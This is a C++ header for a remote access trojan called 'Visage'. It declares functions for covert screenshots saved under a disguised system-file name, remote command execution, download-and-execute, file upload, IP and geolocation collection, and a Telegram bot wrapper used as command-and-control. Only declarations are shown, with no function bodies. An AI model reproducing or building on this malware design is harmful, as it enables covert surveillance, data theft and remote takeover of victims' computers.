#include <iostream>
#include <vector>
#include <Windows.h>
#define _DEBUG_
#define mprintf(a) MessageBoxA(0,a,0,0)
#define VISAGE_SCREENSHOT_FILENAME L"C:\\Users\\msmd.sys"

extern "C" void __declspec(dllexport) VisageInit();

/*Rat functionality*/
int SaveScreenshot(std::string filename, ULONG uQuality);
std::string GetSysInfo();
std::string ExecCmd(std::string cmd);
std::string DownloadExec(std::string url,std::string path);


/*General purpose https*/
std::string WINHTTP_GET(LPCWSTR host, LPCWSTR path);
std::string WINHTTP_POST(LPCWSTR host,LPCWSTR path,const char*data);
BOOL WINHTTP_UPLOAD_FILE(wchar_t *wszURL, wchar_t *wszFilePath, wchar_t *_wszProxyAddress, wchar_t *_wszServerAddress);


/*telegram api wrapper*/
int TeleSendMessage(const char*data, const char* botToken, const char*channelID);
std::string TeleUpdateMostRecent(const char*botToken, int offset);
int TeleGetCurrentOffset(const char*botToken);
std::string TeleParseData(std::string response);
bool TeleCheckIfEmpty(std::string data);
std::string TeleHandleCommand(std::string data,std::string ip); //handle input and return string to send back
std::string TeleParseArgs(std::string data);
std::string TeleUploadScreenShot(const char* botToken,const char*channelID);
std::string TeleParseArg1(std::string data);
std::string TeleParseArg2(std::string data);



/*Utilities*/
std::wstring s2ws(const std::string& s);
std::string getlocalIPnGeoInfo();
std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len);
static inline bool is_base64(unsigned char c);
std::string base64_decode(std::string const& encoded_string);
std::string ReadEntireFile(LPCWSTR path);
void WriteEntireFileA(const char *path,std::string data);


